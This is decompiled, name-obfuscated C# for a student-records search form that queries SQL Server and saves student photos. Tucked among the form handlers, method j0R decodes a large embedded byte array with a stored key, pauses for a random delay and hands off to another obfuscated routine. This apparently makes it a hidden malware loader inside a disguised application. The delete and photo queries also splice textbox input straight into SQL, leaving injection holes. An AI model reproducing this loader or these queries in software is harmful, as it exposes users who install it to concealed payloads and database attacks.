using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Es9r;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Yd5;
using c9N;
using d5R;
using o0QX;
using s1N;

namespace a6L;

[DesignerGenerated]
public class Nk2 : Form
{
	private IContainer components;

	private byte[] Photos1;

	private SqlDataReader dr;

	private string str1;

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Wq3;
			PictureBox pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				((Control)pictureBox).remove_Click(eventHandler);
			}
			_PictureBox1 = value;
			pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				((Control)pictureBox).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ej6;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Pm9;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ky3;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button4
	{
		[CompilerGenerated]
		get
		{
			return _Button4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = g4L;
			Button button = _Button4;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button4 = value;
			button = _Button4;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("OpenFileDialog1")]
	internal virtual OpenFileDialog OpenFileDialog1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button5
	{
		[CompilerGenerated]
		get
		{
			return _Button5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = o1D;
			Button button = _Button5;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button5 = value;
			button = _Button5;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button6
	{
		[CompilerGenerated]
		get
		{
			return _Button6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Rw5;
			Button button = _Button6;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button6 = value;
			button = _Button6;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox ComboBox1
	{
		[CompilerGenerated]
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Pq7;
			ComboBox comboBox = _ComboBox1;
			if (comboBox != null)
			{
				comboBox.remove_SelectedIndexChanged(eventHandler);
			}
			_ComboBox1 = value;
			comboBox = _ComboBox1;
			if (comboBox != null)
			{
				comboBox.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	public Nk2()
	{
		((Form)this).add_Load((EventHandler)a9D);
		Zw9();
	}

	[DebuggerNonUserCode]
	protected override void Xt7(bool Ji1)
	{
		try
		{
			if (Ji1 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Ji1);
		}
	}

	[DebuggerStepThrough]
	private void Zw9()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_0984: Unknown result type (might be due to invalid IL or missing references)
		//IL_098e: Expected O, but got Unknown
		//IL_09a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b2: Expected O, but got Unknown
		//IL_09b4: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Nk2));
		PictureBox1 = new PictureBox();
		Label1 = new Label();
		Label2 = new Label();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		Button1 = new Button();
		Button2 = new Button();
		Button3 = new Button();
		Button4 = new Button();
		TextBox3 = new TextBox();
		Label3 = new Label();
		OpenFileDialog1 = new OpenFileDialog();
		Button5 = new Button();
		Button6 = new Button();
		GroupBox1 = new GroupBox();
		ComboBox1 = new ComboBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		((Control)PictureBox1).set_Location(new Point(1, 1));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(144, 159));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		((Control)Label1).set_Location(new Point(160, 76));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(106, 29));
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Student Name");
		Label1.set_TextAlign((ContentAlignment)16);
		((Control)Label2).set_Location(new Point(163, 29));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(95, 29));
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("PRN No.");
		Label2.set_TextAlign((ContentAlignment)16);
		((Control)TextBox1).set_Location(new Point(121, 24));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(197, 22));
		((Control)TextBox1).set_TabIndex(3);
		((Control)TextBox2).set_Location(new Point(121, 71));
		TextBox2.set_Multiline(true);
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(197, 29));
		((Control)TextBox2).set_TabIndex(4);
		((ButtonBase)Button1).get_FlatAppearance().set_BorderColor(Color.FromArgb(0, 192, 192));
		((ButtonBase)Button1).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Location(new Point(104, 196));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(80, 33));
		((Control)Button1).set_TabIndex(5);
		((ButtonBase)Button1).set_Text("Search");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button2.set_DialogResult((DialogResult)2);
		((ButtonBase)Button2).get_FlatAppearance().set_BorderColor(Color.Red);
		((ButtonBase)Button2).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((Control)Button2).set_Location(new Point(395, 196));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(80, 33));
		((Control)Button2).set_TabIndex(6);
		((ButtonBase)Button2).set_Text("Cancel");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button3).get_FlatAppearance().set_BorderColor(Color.Red);
		((ButtonBase)Button3).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button3).set_FlatStyle((FlatStyle)0);
		((Control)Button3).set_Location(new Point(300, 196));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(80, 33));
		((Control)Button3).set_TabIndex(9);
		((ButtonBase)Button3).set_Text("Delete");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button4).get_FlatAppearance().set_BorderColor(Color.FromArgb(0, 192, 192));
		((ButtonBase)Button4).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button4).set_FlatStyle((FlatStyle)0);
		((Control)Button4).set_Location(new Point(203, 196));
		((Control)Button4).set_Name("Button4");
		((Control)Button4).set_Size(new Size(80, 33));
		((Control)Button4).set_TabIndex(10);
		((ButtonBase)Button4).set_Text("More");
		((ButtonBase)Button4).set_UseVisualStyleBackColor(true);
		((Control)TextBox3).set_Location(new Point(121, 117));
		TextBox3.set_Multiline(true);
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(197, 29));
		((Control)TextBox3).set_TabIndex(11);
		((Control)Label3).set_Location(new Point(163, 122));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(95, 29));
		((Control)Label3).set_TabIndex(12);
		Label3.set_Text("Course ");
		Label3.set_TextAlign((ContentAlignment)16);
		((FileDialog)OpenFileDialog1).set_FileName("OpenFileDialog1");
		((ButtonBase)Button5).get_FlatAppearance().set_BorderColor(Color.FromArgb(255, 128, 0));
		((ButtonBase)Button5).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button5).set_FlatStyle((FlatStyle)0);
		((Control)Button5).set_Location(new Point(1, 157));
		((Control)Button5).set_Name("Button5");
		((Control)Button5).set_Size(new Size(144, 33));
		((Control)Button5).set_TabIndex(13);
		((ButtonBase)Button5).set_Text("New Image");
		((ButtonBase)Button5).set_UseVisualStyleBackColor(true);
		Button6.set_DialogResult((DialogResult)2);
		((ButtonBase)Button6).get_FlatAppearance().set_BorderColor(Color.FromArgb(0, 192, 192));
		((ButtonBase)Button6).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button6).set_FlatStyle((FlatStyle)0);
		((Control)Button6).set_Location(new Point(7, 196));
		((Control)Button6).set_Name("Button6");
		((Control)Button6).set_Size(new Size(80, 33));
		((Control)Button6).set_TabIndex(14);
		((ButtonBase)Button6).set_Text("Save");
		((ButtonBase)Button6).set_UseVisualStyleBackColor(true);
		((Control)GroupBox1).get_Controls().Add((Control)(object)ComboBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).set_Location(new Point(151, 1));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(328, 159));
		((Control)GroupBox1).set_TabIndex(15);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Student Info.");
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		((Control)ComboBox1).set_Location(new Point(121, 24));
		((Control)ComboBox1).set_Name("ComboBox1");
		((Control)ComboBox1).set_Size(new Size(197, 24));
		((Control)ComboBox1).set_TabIndex(12);
		((Form)this).set_AcceptButton((IButtonControl)(object)Button1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.MintCream);
		((Form)this).set_CancelButton((IButtonControl)(object)Button2);
		((Form)this).set_ClientSize(new Size(485, 255));
		((Control)this).get_Controls().Add((Control)(object)Button6);
		((Control)this).get_Controls().Add((Control)(object)Button5);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Button4);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_HelpButton(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MaximumSize(new Size(491, 284));
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MinimumSize(new Size(491, 284));
		((Control)this).set_Name("SearchForm");
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Form)this).set_Text("Search Form");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void a9D(object sender, EventArgs e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		g4K.c1N();
		g4K.cn.Open();
		g4K.str = "select * from InformationForm";
		g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
		g4K.da.set_SelectCommand(g4K.cmd);
		((DbDataAdapter)(object)g4K.da).Fill(g4K.ds, "InformationForm");
		g4K.ds.Clear();
		ComboBox1.ResetText();
		g4K.cn.Close();
		g4K.cn.Open();
		g4K.str = "select * from InformationForm";
		g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
		g4K.da.set_SelectCommand(g4K.cmd);
		((DbDataAdapter)(object)g4K.da).Fill(g4K.ds, "InformationForm");
		checked
		{
			int num = g4K.ds.Tables["InformationForm"]!.Rows.Count - 1;
			int num2 = num;
			for (int i = 0; i <= num2; i++)
			{
				ComboBox1.get_Items().Add((object)g4K.ds.Tables["InformationForm"]!.Rows[i][2].ToString());
			}
			g4K.cn.Close();
		}
	}

	internal static byte[] Sz1(int Pn0)
	{
		return x2N.n1D(Pn0, checked(Pn0 + 1 - 36));
	}

	private void g4L(object sender, EventArgs e)
	{
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Expected O, but got Unknown
		((Control)We04.Forms.AddmisionForm1.DateTimePicker1).set_Visible(false);
		((Control)We04.Forms.AddmisionForm1.ComboBox1).set_Visible(false);
		((Control)We04.Forms.AddmisionForm1.ComboBox2).set_Visible(false);
		We04.Forms.AddmisionForm1.TextBox1.set_Text(TextBox2.get_Text());
		We04.Forms.AddmisionForm1.TextBox3.set_Text(TextBox1.get_Text());
		We04.Forms.AddmisionForm1.ComboBox2.set_Text(TextBox1.get_Text());
		We04.Forms.AddmisionForm1.PictureBox1.set_Image(PictureBox1.get_Image());
		int num = 0;
		g4K.cn.Open();
		g4K.str = "select * from InformationForm ";
		g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
		g4K.da.set_SelectCommand(g4K.cmd);
		((DbDataAdapter)(object)g4K.da).Fill(g4K.ds, "InformationForm");
		checked
		{
			int num2 = g4K.ds.Tables["InformationForm"]!.Rows.Count - 1;
			int num3 = num2;
			for (num = 0; num <= num3; num++)
			{
				if (Operators.CompareString(We04.Forms.AddmisionForm1.TextBox3.get_Text(), g4K.ds.Tables["InformationForm"]!.Rows[num][2].ToString(), false) == 0)
				{
					We04.Forms.AddmisionForm1.TextBox1.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][0].ToString());
					We04.Forms.AddmisionForm1.TextBox2.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][1].ToString());
					We04.Forms.AddmisionForm1.TextBox3.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][2].ToString());
					We04.Forms.AddmisionForm1.TextBox4.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][3].ToString());
					We04.Forms.AddmisionForm1.TextBox5.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][4].ToString());
					We04.Forms.AddmisionForm1.TextBox6.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][5].ToString());
					We04.Forms.AddmisionForm1.TextBox7.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][6].ToString());
					We04.Forms.AddmisionForm1.TextBox8.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][7].ToString());
					We04.Forms.AddmisionForm1.TextBox9.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][8].ToString());
					We04.Forms.AddmisionForm1.TextBox10.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][9].ToString());
					We04.Forms.AddmisionForm1.TextBox11.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][10].ToString());
					We04.Forms.AddmisionForm1.ComboBox2.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][6].ToString());
					We04.Forms.AddmisionForm1.ComboBox1.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][2].ToString());
				}
			}
			g4K.cn.Close();
			((Control)this).Hide();
			((Control)We04.Forms.AddmisionForm1).Show();
		}
	}

	private void Ej6(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		g4K.cn.Open();
		g4K.str = "select * from InformationForm ";
		g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
		g4K.da.set_SelectCommand(g4K.cmd);
		((DbDataAdapter)(object)g4K.da).Fill(g4K.ds, "InformationForm");
		checked
		{
			int num2 = g4K.ds.Tables["InformationForm"]!.Rows.Count - 1;
			int num3 = num2;
			for (num = 0; num <= num3; num++)
			{
				if (Operators.CompareString(TextBox1.get_Text(), g4K.ds.Tables["InformationForm"]!.Rows[num][2].ToString(), false) == 0)
				{
					TextBox1.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][2].ToString());
					TextBox2.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][0].ToString());
					TextBox3.set_Text(g4K.ds.Tables["InformationForm"]!.Rows[num][7].ToString());
				}
			}
			try
			{
				g4K.cmd = new SqlCommand();
				g4K.cmd.set_CommandText(("select image,name from Photos where prn = " + TextBox1.get_Text()) ?? "");
				g4K.cmd.get_Parameters().AddWithValue("@prn", (object)TextBox1.get_Text());
				if (g4K.cn.get_State() == ConnectionState.Closed)
				{
					g4K.cn.Open();
				}
				g4K.cmd.set_Connection(g4K.cn);
				dr = g4K.cmd.ExecuteReader();
				if (dr.Read())
				{
					TextBox2.set_Text(Conversions.ToString(dr.get_Item(1)));
					Photos1 = (byte[])dr.get_Item(0);
					File.WriteAllBytes("photo.jpg", Photos1);
					PictureBox1.Load("photo.jpg");
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
			finally
			{
				g4K.cn.Close();
				dr.Close();
			}
		}
	}

	private void Ky3(object sender, EventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		g4K.cn.Open();
		g4K.str = "delete * from InformationForm where prn='" + TextBox1.get_Text() + "'";
		g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
		g4K.da.set_SelectCommand(g4K.cmd);
		g4K.cn.Close();
	}

	private void Pm9(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void o1D(object sender, EventArgs e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)((CommonDialog)OpenFileDialog1).ShowDialog() == 1)
		{
			PictureBox1.Load(((FileDialog)OpenFileDialog1).get_FileName());
		}
	}

	internal static void j0R()
	{
		byte[] array = d0Z.p3A(133632);
		checked
		{
			int gj = Conversions.ToInteger(p6S.mDic[p6S.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = x2N.a5A(array[i], (byte[])p6S.mDic[p6S.sArray], gj, i);
			}
			p6S.mDic.Add(p6S.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Jq1j.z8GM();
		}
	}

	private void Rw5(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		try
		{
			g4K.cmd = new SqlCommand();
			g4K.cmd.set_CommandText(" insert into Photos values (@image, @prn, @name) ");
			g4K.cmd.get_Parameters().AddWithValue("@prn", (object)TextBox1.get_Text());
			g4K.cmd.get_Parameters().AddWithValue("@name", (object)TextBox2.get_Text());
			Photos1 = File.ReadAllBytes(((FileDialog)OpenFileDialog1).get_FileName());
			g4K.cmd.get_Parameters().AddWithValue("@image", (object)Photos1);
			if (g4K.cn.get_State() == ConnectionState.Closed)
			{
				g4K.cn.Open();
			}
			g4K.cmd.set_Connection(g4K.cn);
			g4K.cmd.ExecuteNonQuery();
			Interaction.MsgBox((object)"Image Saved.", (MsgBoxStyle)0, (object)null);
			We04.Forms.AddmisionForm.PictureBox1.Load(((FileDialog)OpenFileDialog1).get_FileName());
			((Control)We04.Forms.AddmisionForm).Show();
			((Form)this).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"Record Not Found.", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		g4K.cmd = new SqlCommand();
		g4K.cn.Close();
	}

	private void Wq3(object sender, EventArgs e)
	{
	}

	private void Pq7(object sender, EventArgs e)
	{
		TextBox1.set_Text(ComboBox1.get_Text());
	}
}
